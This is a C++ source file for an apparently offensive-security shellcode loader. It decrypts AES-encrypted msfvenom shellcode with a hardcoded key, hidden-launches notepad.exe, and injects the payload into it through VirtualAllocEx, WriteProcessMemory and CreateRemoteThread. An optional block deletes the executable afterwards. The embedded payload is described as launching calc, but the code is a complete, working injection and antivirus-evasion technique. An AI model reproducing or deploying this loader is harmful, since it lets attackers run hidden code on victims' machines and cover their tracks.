#include <iostream>
#include <Windows.h>
#include "../include/tiny-AES-c/aes.hpp"
#include <strsafe.h>

void deleteSelf(char* processName)
{
    char command[256] = "start /min cmd /c del ";
    strcat_s(command, processName);
    system(command);
}

int main(int argc, char* argv[])
{
    // Aes encrypted: msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f c 
    unsigned char shellcode[] = "\x99\x16\xd5\x6c\x07\x14\x3b\x0e\x9a\x81\xaa\xe0\x10\x1a\xe8\xcd\xe2\xb9\x9a\x88\xb0\x17\xce\x61\x1b\x21\xa5\xe3\x23\xe2\x25\x7e\x37\x22\x72\x1e\x46\x32\x95\xa4\x76\x0a\x86\x0c\x21\xb5\xd6\xc3\xbe\x1a\x0f\xa2\x8b\x5a\x46\x19\xef\x55\x5b\xac\x2b\xf2\x31\xb3\x01\x1b\x2f\x76\xab\x1c\xde\x3b\xca\xc0\x40\xca\xbf\xf0\x39\x76\xb9\x11\x98\x92\xb3\x96\x06\x00\xe3\x8c\x55\xeb\xc4\x27\x13\xc6\xed\x9f\xc5\x5a\x80\xe3\x1d\x93\xca\xb6\x3e\xb8\xf6\x67\x9c\xf5\xcf\xf9\x3e\xec\xf8\xa3\xeb\x3f\xe4\x19\x1d\xd5\xdf\x1b\x48\x08\x4b\x3f\x42\xe8\x74\xa3\xb1\x92\xa9\x52\xe3\xcc\x47\xef\x87\x48\xad\x5a\x63\xd2\xee\x08\x11\x3f\x51\x80\xfc\x97\x57\xe9\x8b\x2d\x66\xc6\x52\xbe\x42\x5c\x95\x93\xc6\x80\x3d\xe1\xab\x06\xc0\xb0\x84\x6a\xf8\x1b\x97\xe4\xd5\x55\x08\x4a\xa4\xb6\x25\xa9\x76\x2a\x4e\xb0\x3b\x62\xd8\x73\xa7\xfb\x4f\xbb\x8f\x1b\x87\xcc\x4a\x36\xbe\xd1\x86\xf2\x1f\x4b\xe7\xad\xf9\x09\x83\x7f\x51\xc4\x4a\x92\xe9\x44\x10\x71\xa4\x41\x6d\x4c\xe2\x43\x60\x7c\xdf\x93\x82\xd5\x6d\x3d\xee\x81\x2b\x26\xdd\xd7\x23\x94\xdc\xdf\xd2\xcc\x4f\xf3\xbb\x69\x76\x49\x44\xdd\x25\xb8\xfd\x33\x2b\x8f\x16\x2c\x5c\x91";
    SIZE_T shellcodeSize = sizeof(shellcode);

    // decrypt shellcode encrypted with AesCrypter
    struct AES_ctx ctx;
    unsigned char key[] = "dead00af";
    unsigned char iv[] = "\xde\xad\xaf\x3b\xa3\x4b\xec\x66\x63\x66\x68\x51\x11\x47\xa5\x98";
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, shellcode, shellcodeSize);

    // Create a 64-bit process: 
    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInfo;
    LPVOID allocation_start;
    SIZE_T allocation_size = sizeof(shellcode);
    LPCWSTR processToStart;
    HANDLE hProcess, hThread;

    ZeroMemory(&startupInfo, sizeof(startupInfo));
    ZeroMemory(&processInfo, sizeof(processInfo));
    startupInfo.cb = sizeof(startupInfo);
    processToStart = TEXT("C:\\Windows\\System32\\notepad.exe");

    std::cout << "[*] Starting process" << processToStart << std::endl;

    if (!CreateProcess(
        processToStart,					
        nullptr, // Command line
        nullptr, // Process handle not inheritable
        nullptr, // Thread handle not inheritable
        FALSE,	 // Set handle inheritance to FALSE
        CREATE_NO_WINDOW,  
        nullptr, // Use parent's environment block
        nullptr, // Use parent's starting directory 
        &startupInfo,
        &processInfo
    )) {
        DWORD errval = GetLastError();
        std::cout << "[!] FAILED" << errval << std::endl;
    }
    WaitForSingleObject(processInfo.hProcess, 1000); // Allow notepad 1 second to start/initialize. 

    std::cout << "[*] Allocating memory" << std::endl;
    allocation_start = VirtualAllocEx(processInfo.hProcess, nullptr, allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    std::cout << "[*] Writing to process memory" << std::endl;
    WriteProcessMemory(processInfo.hProcess, allocation_start, shellcode, allocation_size, nullptr);

    std::cout << "[*] Creating remote thread" << std::endl;
    HANDLE remoteThread = CreateRemoteThread(processInfo.hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)allocation_start, nullptr, 0, 0);

#ifdef DELETE_SELF
    std::cout << "[*] Wait for thread: " <<  remoteThread << std::endl;
    WaitForSingleObject(remoteThread, INFINITE);
    DWORD exitCode = 0;
    GetExitCodeThread(remoteThread, &exitCode);
    std::cout << "[*] Thread finished: " << exitCode << std::endl;
    char* processName = argv[0];
    deleteSelf(processName);
#endif

    return 0;
}